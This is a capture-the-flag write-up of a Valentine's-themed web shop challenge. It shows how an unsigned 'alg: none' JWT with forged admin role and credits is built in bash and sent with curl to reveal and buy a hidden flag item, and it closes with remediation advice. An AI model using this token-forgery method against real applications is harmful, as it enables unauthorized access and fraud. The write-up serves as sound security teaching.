# TryHeartMe - CTF Writeup

**Author:** Sithum Shihara (ZAARA)  
**Challenge:** TryHeartMe Valentines Shop  
**Category:** Web Exploitation  
**Difficulty:** Easy / Medium  
**Flag:** `THM{*************************************}`

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Exploitation](#exploitation)
  - [Step 1 - Account Registration](#step-1---account-registration)
  - [Step 2 - JWT Token Analysis](#step-2---jwt-token-analysis)
  - [Step 3 - Forging the JWT (Algorithm None Attack)](#step-3---forging-the-jwt-algorithm-none-attack)
  - [Step 4 - Discovering the Hidden Product](#step-4---discovering-the-hidden-product)
  - [Step 5 - Purchasing the ValenFlag](#step-5---purchasing-the-valenflag)
- [Flag](#flag)
- [Remediation](#remediation)
- [References](#references)

---

## Overview

TryHeartMe is a Valentine's Day-themed web challenge that presents a simple online shop where users can browse and purchase items using an internal credit system. The objective is to find and purchase a hidden item called **ValenFlag** to retrieve the flag.

The application relies on JSON Web Tokens (JWT) stored in cookies for session management. A critical vulnerability in the JWT verification logic allows an attacker to forge tokens with arbitrary claims, bypassing both authentication and authorization controls.

---

## Reconnaissance

### Initial Enumeration

The target application is hosted at `http://<TARGET_IP>:5000`. Visiting the homepage reveals a storefront titled **TryHeartMe Valentines Shop** with four visible products:

| Product                      | Price       | Badge   |
|------------------------------|-------------|---------|
| Rose Bouquet (12 stems)      | 120 credits | Popular |
| Heart Chocolates (Box)       | 85 credits  | Limited |
| Chocolate-Dipped Strawberries| 60 credits  | Sweet   |
| Love Letter Card             | 25 credits  | Classic |

The page description states:

> *"Buy items using credits. Online top-ups are currently unavailable."*

This immediately suggests that obtaining credits through legitimate means is not possible, and an alternative approach is required.

### Technology Stack

Examining the HTTP response headers reveals the following:

```
Server: Werkzeug/3.0.1 Python/3.12.3
```

The application is built with Python using Flask (Werkzeug). Static assets include a minimal `app.js` that only handles toast notification animations -- no client-side logic of interest.

---

## Vulnerability Analysis

### JWT-Based Session Management

Upon registering an account, the server issues a cookie named `tryheartme_jwt` containing a full JWT. Decoding the token reveals the following structure:

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "email": "user@example.com",
  "role": "user",
  "credits": 0,
  "iat": 1771049184,
  "theme": "valentine"
}
```

Two critical observations:

1. **Authorization data is stored client-side.** The `role` and `credits` fields are embedded directly in the JWT payload rather than being resolved server-side from a database. This means the server trusts whatever the token claims.

2. **The `alg` field is set to `HS256`.** This opens the door to testing whether the server accepts alternative algorithms, most notably `none`.

### The Algorithm None Attack

The JWT specification defines an `"alg": "none"` option intended for contexts where the token integrity is guaranteed by other means. If a server implementation does not explicitly reject tokens with `alg` set to `none`, an attacker can craft unsigned tokens with arbitrary payloads that the server will accept as valid.

---

## Exploitation

### Step 1 - Account Registration

Register a new account via the `/register` endpoint:

```bash
curl -s -X POST http://<TARGET_IP>:5000/register \
  -d "email=attacker@test.com&password=password123" \
  -c cookies.txt -L
```

The server responds with a `302 Found` redirect and sets the `tryheartme_jwt` cookie. The registered account has `0` credits and a `user` role.

### Step 2 - JWT Token Analysis

Extract and decode the JWT from the `Set-Cookie` header. The token follows the standard `header.payload.signature` format:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImF0dGFja2VyQHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEwNDkxODQsInRoZW1lIjoidmFsZW50aW5lIn0.<signature>
```

Decoding the payload (Base64URL):

```bash
echo "<payload>" | base64 -d
```

```json
{
  "email": "attacker@test.com",
  "role": "user",
  "credits": 0,
  "iat": 1771049184,
  "theme": "valentine"
}
```

The token confirms that the user has no credits and holds the `user` role. Products visible to regular users do not include the target item.

### Step 3 - Forging the JWT (Algorithm None Attack)

Construct a new JWT with `"alg": "none"` in the header and modified payload claims. The signature segment is left empty.

**Forged Header:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Forged Payload:**
```json
{
  "email": "attacker@test.com",
  "role": "admin",
  "credits": 99999,
  "iat": 1771049184,
  "theme": "valentine"
}
```

Build the token:

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"attacker@test.com","role":"admin","credits":99999,"iat":1771049184,"theme":"valentine"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED_JWT="${HEADER}.${PAYLOAD}."
```

The resulting token has no signature but is accepted by the server because the application fails to reject the `none` algorithm.

### Step 4 - Discovering the Hidden Product

Using the forged JWT, request the shop homepage:

```bash
curl -s -b "tryheartme_jwt=$FORGED_JWT" http://<TARGET_IP>:5000/
```

The response now displays **five** products instead of four. A new item is visible:

| Product   | Price       | Badge |
|-----------|-------------|-------|
| ValenFlag | 777 credits | Staff |

The product links to `/product/valenflag` and is only visible to users with the `admin` role. Its description reads:

> *"Buy me for special Valentines flag"*

### Step 5 - Purchasing the ValenFlag

Submit a POST request to the purchase endpoint using the forged token:

```bash
curl -s -b "tryheartme_jwt=$FORGED_JWT" -X POST http://<TARGET_IP>:5000/buy/valenflag -L
```

The server processes the purchase, deducts 777 credits from the forged balance, and redirects to `/receipt/valenflag`. Fetching the receipt page:

```bash
curl -s -b "tryheartme_jwt=$FORGED_JWT" http://<TARGET_IP>:5000/receipt/valenflag
```

The receipt page contains the flag:

```
THM{*************************************}
```

---

## Flag

```
THM{*************************************}
```

---

## Remediation

The following measures would mitigate the vulnerabilities exploited in this challenge:

1. **Reject the `none` algorithm.** The server must explicitly validate the `alg` header and only accept expected algorithms (e.g., `HS256`). Libraries should be configured to whitelist allowed algorithms.

2. **Do not store authorization data in the JWT.** Sensitive claims such as `role` and `credits` should be stored server-side (e.g., in a database) and resolved upon each request using an opaque session identifier or a user ID embedded in the token.

3. **Validate token signatures.** Every incoming JWT must have its signature verified against a strong, securely stored secret key before any claims are trusted.

4. **Use established session management frameworks.** Rather than implementing custom JWT-based sessions, use well-tested session libraries that handle token validation, expiry, and revocation securely.

---

## References

- [RFC 7519 - JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
- [OWASP - JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - JWT Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [Auth0 - Critical Vulnerabilities in JSON Web Token Libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

---

*Written by Sithum Shihara (ZAARA)*
